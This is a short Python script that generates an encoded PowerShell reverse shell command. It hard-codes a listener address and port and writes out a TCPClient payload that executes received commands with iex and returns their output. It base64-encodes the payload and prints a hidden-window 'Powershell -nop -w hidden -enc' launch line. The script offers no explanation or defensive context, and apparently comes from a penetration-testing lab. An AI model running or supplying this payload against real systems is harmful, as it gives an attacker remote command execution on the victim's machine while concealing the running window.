import base64

Listener_IP = '192.168.50.30'
Listener_Port = 442

# The PowerShell reverse shell payload
Payload = f"$client = New-Object System.Net.Sockets.TCPClient({Listener_IP},{Listener_Port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"

Encoded_Payload = base64.b64encode(Payload.encode('utf-16le')).decode('utf-8')

Command = f"Powershell -nop -w hidden -enc {Encoded_Payload}" 

print(Command)
